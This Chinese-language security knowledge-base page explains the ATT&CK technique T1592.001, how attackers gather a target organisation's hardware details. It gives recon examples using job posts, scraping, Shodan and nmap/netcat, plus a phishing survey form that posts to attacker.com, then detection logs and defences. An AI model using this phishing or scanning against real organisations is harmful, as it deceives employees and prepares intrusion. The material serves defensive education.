# T1592-001-收集目标组织主机信息-硬件信息

## 来自 ATT&CK 的描述

在入侵目标组织之前，攻击者可能通过多种外部方式收集目标组织主机硬件的信息（T1592.001）。这些信息可用于目标定位、了解主机配置或指导后续攻击活动（如供应链攻击 T1195、漏洞利用 T1190 或硬件添加 T1200）。硬件信息通常包括主机上硬件的类型、型号、版本，以及是否存在可能指示附加防御措施的组件（如智能卡、生物识别器、专用加密硬件等）。由于这些活动通常在目标组织的视野之外（如通过公开数据源或社交工程）进行，防御者难以直接发现。

攻击者收集硬件信息的动机包括：
- **推测主机配置**：通过硬件型号或版本推断系统用途、操作系统或安全状态，为漏洞利用提供情报。
- **定制攻击向量**：利用硬件信息开发针对特定设备的恶意代码或供应链攻击。
- **供应链攻击**：识别供应链中使用的硬件型号，寻找可利用的弱点。

## 测试案例

以下测试案例展示了攻击者可能使用的外部硬件信息收集方法，聚焦于公开数据源、社交工程和主动扫描，特别包括摄像头型号和其他物联网设备信息。

#### 测试案例 1：通过职位发布收集硬件信息
**关联技术**：T1592.001（硬件信息收集）  
**说明**：  
- 攻击者通过招聘网站（如智联招聘、LinkedIn）或公司官网的职位描述，提取与硬件相关的信息，如服务器型号、摄像头型号或物联网设备。  
**示例操作**：
- 搜索目标组织的职位发布，关键词包括“硬件”、“服务器”、“摄像头”或“物联网”。
- 示例职位描述：  
  ```
  招聘物联网工程师，需熟悉 Hikvision DS-2CD2143G0-I 摄像头和 Dell PowerEdge R740 服务器。
  ```
**输出示例**：
```
Organization: example.com
Hardware: Hikvision DS-2CD2143G0-I Camera, Dell PowerEdge R740 Server
```
**说明**：  
- 职位发布可能泄露硬件型号或物联网设备信息。  
- 关联 T1592.001：通过公开招聘信息收集硬件数据。

#### 测试案例 2：社交媒体爬取硬件信息
**关联技术**：T1592.001（硬件信息收集）  
**说明**：  
- 攻击者通过 LinkedIn、Twitter 或技术论坛（如 Reddit、CSDN）收集员工分享的硬件相关信息，如摄像头或服务器型号。  
**示例操作**（Python 伪代码）：
```python
import requests
from bs4 import BeautifulSoup
url = "https://www.linkedin.com/company/example-org/posts/"
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
# 提取硬件相关信息
hardware_info = [post.text for post in soup.find_all(text=lambda t: "hardware" in t.lower() or "camera" in t.lower() or "server" in t.lower())]
print(hardware_info)
```
**输出示例**：
```
Post: "Deployed new Hikvision DS-2CD2143G0-I cameras for office security."
Hardware: Hikvision DS-2CD2143G0-I Camera
```
**说明**：  
- 员工可能在社交媒体分享硬件部署或配置信息。  
- 关联 T1592.001：通过社交媒体获取硬件信息。

#### 测试案例 3：钓鱼收集硬件信息
**关联技术**：T1592.001（硬件信息收集）、T1566（钓鱼）  
**说明**：  
- 攻击者通过伪造的邮件或调查问卷，诱导员工泄露硬件型号或物联网设备信息。  
**示例操作**：
- 发送伪造邮件：  
  ```
  Subject: 设备支持调查
  Body: 请提供您当前使用的摄像头型号、服务器型号或其他物联网设备信息：http://fake-survey.com
  ```
- 伪造调查页面（HTML 伪代码）：  
  ```html
  <form action="http://attacker.com/collect" method="POST">
      摄像头型号: <input type="text" name="camera">
      服务器型号: <input type="text" name="server">
      <input type="submit" value="提交">
  </form>
  ```
**输出示例**（攻击者服务器日志）：
```
POST /collect HTTP/1.1
camera=Hikvision DS-2CD2143G0-I&server=Dell PowerEdge R740
```
**说明**：  
- 钓鱼攻击可直接收集硬件信息。  
- 关联 T1592.001：通过钓鱼获取硬件信息。

#### 测试案例 4：查询公开技术数据库
**关联技术**：T1592.001（硬件信息收集）  
**说明**：  
- 攻击者通过公开技术数据库（如 Shodan、Censys）或供应商网站查询目标组织的硬件信息，如摄像头或物联网设备型号。  
**示例操作**：
```bash
# 在 Shodan 查询目标 IP 的硬件信息
shodan host 192.168.1.10
# 或访问供应商网站（如 Hikvision、Dell）搜索设备信息
```
**输出示例**：
```
IP: 192.168.1.10
Device: Hikvision DS-2CD2143G0-I Camera
```
**说明**：  
- 公开数据库或供应商网站可能暴露硬件型号。  
- 关联 T1592.001：通过技术数据库获取硬件信息。

#### 测试案例 5：通过主动扫描识别硬件信息
**关联技术**：T1592.001（硬件信息收集）、T1046（网络服务扫描）  
**说明**：  
- 攻击者通过端口扫描或 Banner 抓取识别目标主机上运行的物联网设备或硬件信息。  
**示例操作**：
```bash
# 使用 Nmap 扫描目标主机
nmap -sV -p 80,554,37777 192.168.1.10
# 或使用 netcat 抓取 Banner
nc 192.168.1.10 80
HEAD / HTTP/1.0
```
**输出示例**：
```
Nmap scan report for 192.168.1.10
Port 554/tcp open  rtsp    Hikvision DS-2CD2143G0-I
Port 37777/tcp open  dahua-dvr  Dahua DVR
```
**说明**：  
- `nmap -sV` 可识别物联网设备（如摄像头、DVR）的型号，Banner 抓取可暴露硬件信息。  
- 关联 T1592.001：通过主动扫描收集硬件信息。

## 测试复现

### 外部场景（公开信息收集）
1. **环境**：Kali Linux 或任何带有浏览器的系统。
2. **步骤**：
   - 使用 Shodan 查询目标 IP：`shodan host 192.168.1.10`。
   - 搜索目标组织的职位发布或社交媒体，提取硬件相关关键词（如“摄像头”、“服务器”）。
   - 访问供应商网站（如 Hikvision、Dell）查看设备信息。
   - 使用 Nmap 扫描：`nmap -sV -p 80,554,37777 192.168.1.10`。
3. **预期结果**：返回硬件型号或物联网设备信息（如 `Hikvision DS-2CD2143G0-I Camera`, `Dell PowerEdge R740`）。

## 测试留痕

### 外部场景
- **Web 服务器日志**（若爬取官网）：
  ```
  203.0.113.1 - - [26/May/2025:08:01:00 +0000] "GET /careers HTTP/1.1" 200 1234
  ```
- **邮件网关日志**（钓鱼场景）：
  ```
  Email from: support@fake.com, Subject: 设备支持调查, URL: http://fake-survey.com
  ```
- **网络流量日志**（外部查询或扫描场景）：
  ```
  HTTP GET censys.io/api/v2/hosts/192.168.1.10
  TCP 554, Source: 203.0.113.1, Request: HEAD / HTTP/1.0
  ```

## 建议

### 防御措施
1. **减少公开信息暴露**：
   - 避免在官网、职位发布或社交媒体泄露硬件型号或物联网设备信息。
   - 对技术文档或职位描述进行模糊化处理（如避免提及具体硬件型号）。
   - 配置 Web 服务器限制爬虫访问敏感页面（如使用 CAPTCHA 或限流）。
2. **硬件安全管理**：
   - 定期更新硬件固件，修复已知漏洞。
   - 对物联网设备（如摄像头）启用安全配置（如禁用默认端口、更改默认密码）。
3. **员工培训**：
   - 教育员工识别钓鱼邮件，避免泄露硬件或物联网设备信息。
   - 指导员工在社交媒体限制技术细节的分享（如避免提及摄像头或服务器型号）。
4. **主动 OSINT 评估**：
   - 使用 Shodan 或 Censys 模拟攻击者行为，评估公开硬件信息的暴露程度。
   - 定期检查 Pastebin 或暗网，识别泄露的硬件信息。
5. **网络安全配置**：
   - 使用防火墙限制对敏感端口（如 554、37777）的外部访问。
   - 部署 WAF（Web 应用防火墙）拦截异常爬虫或扫描行为。

### 后续阶段监控
- **钓鱼攻击（T1566）**：
   - 关注利用硬件信息的钓鱼邮件。
- **漏洞利用（T1190）**：
   - 关注针对硬件或物联网设备漏洞的攻击，如异常的设备访问请求。
- **供应链攻击（T1195）**：
   - 关注异常的硬件供应链请求，如伪造的供应商通信。
- **硬件添加（T1200）**：
   - 关注异常的硬件部署或配置更改。

### 外部情报监控
- 订阅威胁情报服务，获取针对组织硬件或物联网设备的扫描或漏洞利用预警。
- 监控暗网或 Pastebin，识别泄露的硬件型号或配置。
- 与行业合作伙伴共享威胁情报，了解类似组织的攻击模式。

## 参考推荐
- MITRE ATT&CK - T1592.001 
  <https://attack.mitre.org/techniques/T1592/001/>
